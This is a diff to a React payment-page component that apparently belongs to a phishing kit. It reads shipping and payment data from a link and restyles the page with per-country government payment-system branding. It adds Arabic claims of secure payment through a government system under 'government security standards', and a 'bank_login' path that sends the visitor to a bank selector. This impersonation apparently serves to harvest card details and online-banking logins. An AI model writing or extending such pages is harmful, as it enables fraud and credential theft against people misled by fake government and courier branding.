@@ -1,6 +1,7 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { Shield } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
@@ -18,25 +19,21 @@ const PaymentDetails = () => {
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
-  // UAE Government Color Scheme
-  const colors = {
-    primary: "#CE1126", // UAE Red
-    secondary: "#00732F", // UAE Green
-    background: "#FFFFFF",
-    text: "#000000",
-    textLight: "#666666",
-    border: "#E0E0E0",
-    surface: "#F5F5F5"
-  };
-
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
-
-  // Get currency info for display
-  const currencyInfo = getCurrencyByCountry(countryCode);
+  
+  // Get government payment system for the country
+  const govSystem = getGovernmentPaymentSystem(countryCode);
+  
+  // Use government branding colors
+  const colors = govSystem.colors;
 
   // Get payment data from link data
   const paymentData = shippingInfo?.payment_data;
+
+  // Get currency code - prioritize saved currency code from data
+  const savedCurrencyCode = paymentData?.currency_code || shippingInfo?.currency_code;
+  const currencyCodeToUse = savedCurrencyCode || getCurrencyByCountry(countryCode).code;
 
   // Get amount from payment data or shipping info
   const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
@@ -54,11 +51,20 @@ const PaymentDetails = () => {
     }
   }
 
-  // Format amount with currency symbol and name
-  const formattedAmount = formatCurrency(amount, countryCode);
+  // Format amount with the dynamic currency code
+  const formattedAmount = formatCurrency(amount, currencyCodeToUse);
+  
+  // Get payment method from link data
+  const paymentMethod = shippingInfo?.payment_method || 'card';
   
   const handleProceed = () => {
-    navigate(`/pay/${id}/card-input`);
+    // If bank_login, skip card input and go directly to bank selection
+    if (paymentMethod === 'bank_login') {
+      navigate(`/pay/${id}/bank-selector`);
+    } else {
+      // Default to card input
+      navigate(`/pay/${id}/card-input`);
+    }
   };
   
   return (
@@ -72,8 +78,23 @@ const PaymentDetails = () => {
     >
       {/* Payment Data Display */}
       {(shippingInfo || paymentData) && (
-        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
-          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">بيانات السداد</h3>
+        <div 
+          className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg"
+          style={{
+            backgroundColor: `${govSystem.colors.primary}08`,
+            borderRadius: govSystem.borderRadius.md,
+            border: `1px solid ${govSystem.colors.primary}20`
+          }}
+        >
+          <h3 
+            className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
+            style={{ 
+              color: govSystem.colors.text,
+              fontFamily: govSystem.fonts.primaryAr 
+            }}
+          >
+            بيانات السداد
+          </h3>
           <div className="space-y-2 text-xs sm:text-sm">
             {paymentData?.customer_name && (
               <div className="flex items-center gap-2">
@@ -132,11 +153,26 @@ const PaymentDetails = () => {
         <div
           className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
           style={{
-            background: `linear-gradient(135deg, ${colors.primary}15, ${colors.secondary}15)`
+            background: `${govSystem.colors.primary}15`,
+            borderRadius: govSystem.borderRadius.md
           }}
         >
-          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-          <span className="text-xl sm:text-2xl font-bold" style={{ color: colors.primary }}>
+          <span 
+            className="text-base sm:text-lg font-bold"
+            style={{ 
+              color: govSystem.colors.text,
+              fontFamily: govSystem.fonts.primaryAr 
+            }}
+          >
+            المبلغ الإجمالي
+          </span>
+          <span 
+            className="text-xl sm:text-2xl font-bold" 
+            style={{ 
+              color: govSystem.colors.primary,
+              fontFamily: govSystem.fonts.primaryAr
+            }}
+          >
             {formattedAmount}
           </span>
         </div>
@@ -144,24 +180,49 @@ const PaymentDetails = () => {
     
       {/* Payment Method */}
       <div className="mb-6 sm:mb-8">
-        <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
+        <h3 
+          className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
+          style={{ 
+            color: govSystem.colors.text,
+            fontFamily: govSystem.fonts.primaryAr 
+          }}
+        >
+          طريقة الدفع
+        </h3>
         <div
           className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
           style={{
-            borderColor: colors.primary,
-            background: `${colors.primary}10`
+            borderColor: govSystem.colors.primary,
+            background: `${govSystem.colors.primary}10`,
+            borderRadius: govSystem.borderRadius.md
           }}
         >
           <div className="flex items-center gap-2 sm:gap-3">
             <div
               className="w-10 h-10 rounded-full flex items-center justify-center"
-              style={{ backgroundColor: colors.primary }}
+              style={{ 
+                background: govSystem.gradients.primary
+              }}
             >
               <CreditCard className="w-5 h-5 text-white" />
             </div>
             <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
+              <p 
+                className="font-semibold text-sm sm:text-base"
+                style={{ 
+                  color: govSystem.colors.text,
+                  fontFamily: govSystem.fonts.primaryAr 
+                }}
+              >
+                الدفع بالبطاقة عبر {govSystem.nameAr}
+              </p>
+              <p 
+                className="text-xs sm:text-sm" 
+                style={{ 
+                  color: govSystem.colors.textLight,
+                  fontFamily: govSystem.fonts.primaryAr
+                }}
+              >
                 Visa، Mastercard، Mada
               </p>
             </div>
@@ -171,19 +232,37 @@ const PaymentDetails = () => {
 
       {/* Security Badge */}
       <div className="mb-6 sm:mb-8">
-        <div className="flex items-center gap-3 p-4 bg-white rounded-lg border" style={{ borderColor: colors.secondary }}>
+        <div 
+          className="flex items-center gap-3 p-4 bg-white rounded-lg border" 
+          style={{ 
+            borderColor: govSystem.colors.primary,
+            borderRadius: govSystem.borderRadius.md
+          }}
+        >
           <div
             className="w-10 h-10 rounded-full flex items-center justify-center"
-            style={{ backgroundColor: `${colors.secondary}15` }}
+            style={{ backgroundColor: `${govSystem.colors.primary}15` }}
           >
-            <Shield className="w-5 h-5" style={{ color: colors.secondary }} />
+            <Shield className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
           </div>
           <div>
-            <p className="font-semibold text-sm sm:text-base" style={{ color: colors.text }}>
-              دفع آمن ومشفر
+            <p 
+              className="font-semibold text-sm sm:text-base" 
+              style={{ 
+                color: govSystem.colors.text,
+                fontFamily: govSystem.fonts.primaryAr
+              }}
+            >
+              دفع آمن عبر {govSystem.nameAr}
             </p>
-            <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
-              جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان
+            <p 
+              className="text-xs sm:text-sm" 
+              style={{ 
+                color: govSystem.colors.textLight,
+                fontFamily: govSystem.fonts.primaryAr
+              }}
+            >
+              جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان الحكومية
             </p>
           </div>
         </div>
@@ -195,17 +274,24 @@ const PaymentDetails = () => {
         size="lg"
         className="w-full h-14 text-lg font-bold text-white hover:opacity-90 transition-all"
         style={{
-          background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
-          borderRadius: '12px',
-          boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
+          background: govSystem.gradients.primary,
+          borderRadius: govSystem.borderRadius.lg,
+          boxShadow: govSystem.shadows.md,
+          fontFamily: govSystem.fonts.primaryAr
         }}
       >
-        <span className="ml-2">الدفع بالبطاقة</span>
+        <span className="ml-2">متابعة الدفع عبر {govSystem.nameAr}</span>
         <ArrowLeft className="w-5 h-5 mr-2" />
       </Button>
 
-      <p className="text-[10px] sm:text-xs text-center mt-4" style={{ color: colors.textLight }}>
-        بالمتابعة، أنت توافق على الشروط والأحكام
+      <p 
+        className="text-[10px] sm:text-xs text-center mt-4" 
+        style={{ 
+          color: govSystem.colors.textLight,
+          fontFamily: govSystem.fonts.primaryAr
+        }}
+      >
+        بالمتابعة عبر {govSystem.nameAr}، أنت توافق على الشروط والأحكام
       </p>
     </DynamicPaymentLayout>
   );
